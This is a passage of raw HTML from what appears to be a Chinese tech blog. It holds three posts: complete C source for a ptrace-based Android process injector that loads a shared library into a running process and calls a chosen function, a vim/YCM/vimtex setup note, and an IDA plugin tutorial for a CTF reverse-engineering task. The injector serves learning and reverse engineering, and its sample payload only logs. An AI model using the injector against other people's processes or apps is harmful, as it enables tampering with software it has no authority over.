class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">const</span> <span class="keyword">char</span>*libname,<span class="keyword">const</span> <span class="keyword">char</span>*funcName)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">oldRegs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">long</span> paras[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">char</span> realLibPath[PATH_MAX];</span><br><span class="line">    realpath(libname,realLibPath);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT]Real path of lib found:%s\n&quot;</span>,realLibPath);</span><br><span class="line"></span><br><span class="line">    ptraceAttach(pid);</span><br><span class="line">    <span class="comment">// 保存寄存器环境</span></span><br><span class="line">    ptraceGetRegs(pid,&amp;oldRegs);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;regs,&amp;oldRegs,<span class="keyword">sizeof</span>(struct pt_regs));</span><br><span class="line">    <span class="comment">// 获取mmap地址</span></span><br><span class="line">    <span class="keyword">void</span> *mmapAddr = getRemoteFuncAddr(pid,libcPath,(<span class="keyword">void</span>*)mmap);</span><br><span class="line">    <span class="comment">// 调用mmap</span></span><br><span class="line">    paras[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    paras[<span class="number">1</span>]=<span class="number">0x1000</span>;</span><br><span class="line">    paras[<span class="number">2</span>]=PROT_READ|PROT_WRITE|PROT_EXEC;</span><br><span class="line">    paras[<span class="number">3</span>]=MAP_ANONYMOUS|MAP_PRIVATE;</span><br><span class="line">    paras[<span class="number">4</span>]=<span class="number">0</span>;</span><br><span class="line">    paras[<span class="number">5</span>]=<span class="number">0</span>;</span><br><span class="line">    ptraceCall(pid,mmapAddr,paras,<span class="number">6</span>,&amp;regs);</span><br><span class="line">    <span class="keyword">void</span> *remoteMemAddr=(<span class="keyword">void</span>*)regs.ARM_r0;</span><br><span class="line">    <span class="keyword">if</span>(remoteMemAddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INJECT ERR]mmapFailed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT] remote mmaped addr:%p\n&quot;</span>,remoteMemAddr);</span><br><span class="line">    <span class="comment">// 调用dlopen</span></span><br><span class="line">    <span class="keyword">void</span> *dlopenAddr=getRemoteFuncAddr(pid,linkerPath,(<span class="keyword">void</span>*)dlopen);</span><br><span class="line">    <span class="keyword">void</span> *dlcloseAddr=getRemoteFuncAddr(pid,linkerPath,(<span class="keyword">void</span>*)dlclose);</span><br><span class="line">    <span class="keyword">void</span> *dlErrorAddr=getRemoteFuncAddr(pid,linkerPath,(<span class="keyword">void</span>*)dlerror);</span><br><span class="line">    ptraceWriteData(pid,remoteMemAddr,realLibPath,<span class="built_in">strlen</span>(realLibPath)+<span class="number">1</span>);   <span class="comment">// 作为dlopen的参数</span></span><br><span class="line">    <span class="comment">//debug start</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAX_PATH];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">    ptraceReadData(pid,remoteMemAddr,buf,<span class="built_in">strlen</span>(realLibPath)+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">    <span class="comment">//debug end</span></span><br><span class="line">    paras[<span class="number">0</span>]=(<span class="keyword">long</span>)remoteMemAddr;</span><br><span class="line">    paras[<span class="number">1</span>]=RTLD_NOW|RTLD_GLOBAL;</span><br><span class="line">    ptraceCall(pid,dlopenAddr,paras,<span class="number">2</span>,&amp;regs);</span><br><span class="line">    <span class="keyword">void</span>*libBaseAddr=(<span class="keyword">void</span>*)regs.ARM_r0;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT]remote lib base:0x%llx of %s\n&quot;</span>,(<span class="keyword">long</span> <span class="keyword">long</span>)libBaseAddr,realLibPath);</span><br><span class="line">    <span class="comment">// 调用dlsym</span></span><br><span class="line">    <span class="keyword">void</span>*dlsymAddr=getRemoteFuncAddr(pid,libcPath,(<span class="keyword">void</span>*)dlsym);</span><br><span class="line">    ptraceWriteData(pid,remoteMemAddr,funcName,<span class="built_in">strlen</span>(funcName)+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//debug start</span></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">    ptraceReadData(pid,remoteMemAddr,buf,<span class="built_in">strlen</span>(funcName)+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">    <span class="comment">//debug end</span></span><br><span class="line">    paras[<span class="number">0</span>]=(<span class="keyword">long</span>)libBaseAddr;</span><br><span class="line">    paras[<span class="number">1</span>]=(<span class="keyword">long</span>)remoteMemAddr;</span><br><span class="line">    ptraceCall(pid,dlsymAddr,paras,<span class="number">2</span>,&amp;regs);</span><br><span class="line">    <span class="keyword">void</span>*remoteFuncAddr = (<span class="keyword">void</span>*)regs.ARM_r0;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT]addr:0x%llx of func %s\n&quot;</span>,(<span class="keyword">long</span> <span class="keyword">long</span>)remoteFuncAddr,funcName);</span><br><span class="line">    <span class="comment">// 调用目标函数</span></span><br><span class="line">    ptraceCall(pid,remoteFuncAddr,paras,<span class="number">0</span>,&amp;regs);</span><br><span class="line">    <span class="comment">// 恢复寄存器环境</span></span><br><span class="line">    ptraceSetRegs(pid,&amp;oldRegs);</span><br><span class="line">    ptraceDetach(pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">findPIdByName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> pDirId = <span class="number">0</span>; <span class="comment">// process dir id</span></span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">char</span> filename[MAX_PATH];</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAX_PATH];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">entry</span>=<span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">int</span> cnt;</span><br><span class="line">    <span class="keyword">if</span>(name==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DIR *dir = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(dir==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>((entry=readdir(dir))!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        pDirId=atoi(entry-&gt;d_name);</span><br><span class="line">        <span class="keyword">if</span>(pDirId!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(filename,MAX_PATH,<span class="string">&quot;/proc/%d/cmdline&quot;</span>,pDirId);</span><br><span class="line">            f = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(f)&#123;</span><br><span class="line">                fgets(cmdline,<span class="keyword">sizeof</span>(cmdline),f);</span><br><span class="line">                cnt = (<span class="keyword">int</span>)<span class="built_in">strlen</span>(cmdline);</span><br><span class="line">                <span class="keyword">while</span>(cnt&gt;=<span class="number">0</span>&amp;&amp;cmdline[cnt]!=<span class="string">&#x27;/&#x27;</span>)cnt--; <span class="comment">// cmdline是完整路径，这里只找最后一个/之后的，就是可执行文件的文件名</span></span><br><span class="line">                cnt++;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(name,&amp;cmdline[cnt],<span class="built_in">strlen</span>(name)))&#123;</span><br><span class="line">                    pid=pDirId;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose(f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: inject processname libexample.so funcname\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = findPIdByName(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT]found pid:%d of %s\n&quot;</span>,pid,argv[<span class="number">1</span>]);</span><br><span class="line">    inject(pid,argv[<span class="number">2</span>],argv[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要注入的so文件编译</p>
+<p>Android.mk</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH:=<span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span></span><br><span class="line"></span><br><span class="line">LOCAL_MODULE := hook</span><br><span class="line">LOCAL_SRC_FILES := hook.c</span><br><span class="line">LOCAL_LDLIBS += -llog</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(BUILD_SHARED_LIBRARY)</span></span><br></pre></td></tr></table></figure>
+<p>Application.mk指定架构即可</p>
+<p>hook.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">&quot;INJECT&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(...) ((void)__android_log_print(ANDROID_LOG_DEBUG  , LOG_TAG, __VA_ARGS__))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _init(<span class="keyword">void</span>)&#123;</span><br><span class="line">    LOGD(<span class="string">&quot;Injected!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hookEntry</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LOGD(<span class="string">&quot;Hook Entry called\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里init可以作为Android的.init段，在so加载时执行</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c546783ad284">https://www.jianshu.com/p/c546783ad284</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5361?spm=5176.12901015.0.i12901015.583e525cW8q5ne">https://xz.aliyun.com/t/5361?spm=5176.12901015.0.i12901015.583e525cW8q5ne</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://gslab.qq.com/portal.php?mod=view&amp;aid=162">https://gslab.qq.com/portal.php?mod=view&amp;aid=162</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-note/linux/vim-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/19/note/linux/vim-1/" class="article-date">
+  	<time datetime="2021-01-19T03:44:46.000Z" itemprop="datePublished">2021-01-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/19/note/linux/vim-1/">
+        some tips when use vim
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>linux安装vim时需要的插件和一些坑</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S gvim <span class="comment"># 安装gvim以支持系统剪切板</span></span><br></pre></td></tr></table></figure>
+
+<p>文件组织</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-~</span><br><span class="line">--.vimrc </span><br><span class="line">--.vim </span><br><span class="line">---my_config.vim</span><br><span class="line">---my_plugins.vim</span><br><span class="line">--+bundle</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">source</span> ~/.<span class="keyword">vim</span>/my_plugins.<span class="keyword">vim</span></span><br><span class="line"><span class="keyword">source</span> ~/.<span class="keyword">vim</span>/my_config.<span class="keyword">vim</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&quot; my_config.vim</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">nu</span> <span class="comment">&quot;显示行号</span></span><br><span class="line"><span class="keyword">syntax</span> <span class="keyword">on</span> <span class="comment">&quot;语法高亮</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">ts</span>=<span class="number">4</span> <span class="comment">&quot;用4个空格替换tab</span></span><br><span class="line"><span class="keyword">set</span> expandtab</span><br><span class="line"><span class="keyword">set</span> autoindent</span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span> “设置之后可以使用gg=G自动格式化</span><br><span class="line"><span class="keyword">set</span> incsearch <span class="comment">&quot;搜索的实时预览</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_min_num_identifier_candidate_chars</span> = <span class="number">2</span> <span class="comment">&quot;设置ycm自动补全触发字符为2</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_key_invoke_completion</span> = <span class="string">&#x27;&lt;c-z&gt;&#x27;</span> <span class="comment">&quot;设置ycm自动不全触发健为Ctrl+z</span></span><br></pre></td></tr></table></figure>
+
+
+<p>安装vundle插件 <a target="_blank" rel="noopener" href="https://github.com/VundleVim/Vundle.vim">https://github.com/VundleVim/Vundle.vim</a> ，把对应的配置放在my_plugins里面</p>
+<p>安装YCM插件 <a target="_blank" rel="noopener" href="https://github.com/ycm-core/YouCompleteMe">https://github.com/ycm-core/YouCompleteMe</a> ，这里要注意的是，go和mono，jdt的language-server会下载失败，对应的解决方法如下</p>
+<ol>
+<li>go</li>
+</ol>
+<p>设置go代理和github代理</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>
+<p>设置github代理，需要自己有代理</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line">git config --global https.proxy https://127.0.0.1:1080</span><br><span class="line">git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span> </span><br><span class="line">git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line"><span class="comment"># 取消</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>npm<br>使用cnpm自己安装<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install cnpm -g --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></li>
+<li>其它</li>
+</ol>
+<p>使用find命令确定下的包在哪，使用proxychains配合wget/curl/axel自己下载放在对应的位置</p>
+<h2 id="安装vimtex"><a href="#安装vimtex" class="headerlink" title="安装vimtex"></a>安装vimtex</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Plugin <span class="string">&#x27;lervag/vimtex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ========================= vimtex==========</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vimtex_view_method</span>=<span class="string">&#x27;zathura&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:tex_flavor</span>=<span class="string">&#x27;latex&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vimtex_compiler_progname</span> = <span class="string">&#x27;nvr&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 阅读器相关的配置 包含正反向查找功能 仅供参考</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vimtex_view_general_viewer</span> = <span class="string">&#x27;zathura&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vimtex_view_general_options_latexmk</span> = <span class="string">&#x27;-reuse-instance&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vimtex_view_general_options</span></span><br><span class="line">\ = <span class="string">&#x27;-reuse-instance -forward-search @tex @line @pdf&#x27;</span></span><br><span class="line">\ . <span class="string">&#x27; -inverse-search &quot;&#x27;</span> . exepath(<span class="variable">v:progpath</span>)</span><br><span class="line">\ . <span class="string">&#x27; --servername &#x27;</span> . <span class="variable">v:servername</span></span><br><span class="line">\ . <span class="string">&#x27; --remote-send \&quot;^&lt;C-\^&gt;^&lt;C-n^&gt;&#x27;</span></span><br><span class="line">\ . <span class="string">&#x27;:execute &#x27;</span><span class="string">&#x27;drop &#x27;</span><span class="string">&#x27; . fnameescape(&#x27;</span><span class="string">&#x27;\%f&#x27;</span><span class="string">&#x27;)^&lt;CR^&gt;&#x27;</span></span><br><span class="line">\ . <span class="string">&#x27;:\%l^&lt;CR^&gt;:normal\! zzzv^&lt;CR^&gt;&#x27;</span></span><br><span class="line">\ . <span class="string">&#x27;:call remote_foreground(&#x27;</span><span class="string">&#x27;&#x27;</span>.<span class="variable">v:servername</span>.<span class="string">&#x27;&#x27;</span><span class="string">&#x27;)^&lt;CR^&gt;^&lt;CR^&gt;\&quot;&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> conceallevel=<span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:tex_conceal</span>=<span class="string">&#x27;abdmg&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ========================================</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用”+y命令可以复制到系统剪贴板</p>
+<p>安装好后，在vim中按”\ll”即可进行实时预览(需要有zathura以及pdf插件)</p>
+<p>安装texlive</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S texlive-most texlive-lang</span><br><span class="line">yay -S texlive-local-manager <span class="comment"># 提供插件管理系统</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-note/rev/rev-4" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/05/note/rev/rev-4/" class="article-date">
+  	<time datetime="2021-01-05T03:32:48.000Z" itemprop="datePublished">2021-01-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/05/note/rev/rev-4/">
+        IDA插件编写学习笔记
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="插件目录结构"><a href="#插件目录结构" class="headerlink" title="插件目录结构"></a>插件目录结构</h2><blockquote>
+<p>ida安装目录</p>
+<blockquote>
+<p>plugins</p>
+<blockquote>
+<p>plugin_script.py</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>python</p>
+<blockquote>
+<p>plugin_script</p>
+<blockquote>
+<p>plugin_script_impl.py</p>
+<p>__init__.py</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>其中plugin_script可以是自己定义的名称</p>
+<p>plugin_script.py文件结构</p>
+<h2 id="插件示例"><a href="#插件示例" class="headerlink" title="插件示例"></a>插件示例</h2><p>示例：打印程序中的空函数listNullFunc.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNullFunc</span>(<span class="params">idaapi.plugin_t</span>):</span> <span class="comment"># 需要继承自IDA的插件类</span></span><br><span class="line">    flags = idaapi.PLUGIN_UNL</span><br><span class="line">    comment=<span class="string">&quot;List All null functions&quot;</span> </span><br><span class="line">    wanted_name=<span class="string">&quot;List Null Func&quot;</span> <span class="comment"># 插件名称</span></span><br><span class="line">    wanted_hotkey=<span class="string">&quot;Ctrl-Alt-Y&quot;</span> <span class="comment"># 插件快捷键</span></span><br><span class="line">    help=<span class="string">&quot;so...&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 插件初始化时的操作</span></span><br><span class="line">        idaapi.msg(<span class="string">&quot;[lnf]List All Null functions starts\n&quot;</span>)</span><br><span class="line">        idaapi.require(<span class="string">&#x27;listNullFunc&#x27;</span>) <span class="comment"># 导入python目录下的模块</span></span><br><span class="line">        idaapi.require(<span class="string">&#x27;listNullFunc.listNullFuncImpl&#x27;</span>)</span><br><span class="line">        <span class="comment"># PLUGIN_KEEP</span></span><br><span class="line">        <span class="keyword">return</span> idaapi.PLUGIN_OK</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self,arg</span>):</span></span><br><span class="line">        <span class="comment"># 插件的入口函数</span></span><br><span class="line">        idaapi.msg(<span class="string">&quot;[lnf]List All Null functions runs\n&quot;</span>)</span><br><span class="line">        listNullFunc.listNullFuncImpl.main()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">term</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 插件结束时调用的方法</span></span><br><span class="line">        idaapi.msg(<span class="string">&quot;[lnf]List Null Func stopped\n&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PLUGIN_ENTRY</span>():</span></span><br><span class="line">    <span class="keyword">return</span> ListNullFunc()</span><br></pre></td></tr></table></figure>
+<p>ListNullFuncImpl.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    msg(<span class="string">&quot;[lnf]: These are Null Functions\n&quot;</span>)</span><br><span class="line">    funcs = Functions()</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> funcs:</span><br><span class="line">        <span class="comment"># print(hex(func))</span></span><br><span class="line">        <span class="comment"># print(get_bytes(func,1))</span></span><br><span class="line">        <span class="keyword">if</span> get_bytes(func,<span class="number">1</span>)[<span class="number">0</span>]==<span class="number">0xc3</span>:</span><br><span class="line">            print(hex(func),<span class="string">&quot;is a null function&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>接下来按照上面的文件结构部署插件</p>
+<p>也可以扫描目标函数然后patch掉空函数调用</p>
+<p>使用nu1l 公开赛RE1实验，花指令，空函数比较多</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[lnf]List All Null functions starts</span><br><span class="line">[lnf]List All Null functions runs</span><br><span class="line">[lnf]: These are Null Functions</span><br><span class="line">0x123410ad is a null function</span><br><span class="line">0x1234116c is a null function</span><br><span class="line">0x12341256 is a null function</span><br><span class="line">0x123412ac is a null function</span><br><span class="line">0x123412b8 is a null function</span><br><span class="line">0x123412da is a null function</span><br><span class="line">0x123412ee is a null function</span><br><span class="line">0x123412fe is a null function</span><br><span class="line">0x12341315 is a null function</span><br><span class="line">0x12341326 is a null function</span><br><span class="line">0x12341365 is a null function</span><br><span class="line">0x12341389 is a null function</span><br><span class="line">0x123413bc is a null function</span><br><span class="line">0x12341454 is a null function</span><br><span class="line">0x1234146b is a null function</span><br><span class="line">0x123414e7 is a null function</span><br><span class="line">0x123414fb is a null function</span><br><span class="line">0x1234154c is a null function</span><br><span class="line">0x12341560 is a null function</span><br><span class="line">0x123415f3 is a null function</span><br><span class="line">0x12341603 is a null function</span><br><span class="line">0x12341617 is a null function</span><br><span class="line">0x12341d7e is a null function</span><br><span class="line">[lnf]List Null Func stopped</span><br></pre></td></tr></table></figure>
+
+<h2 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h2><p>大部分IDA插件也可以如此安装</p>
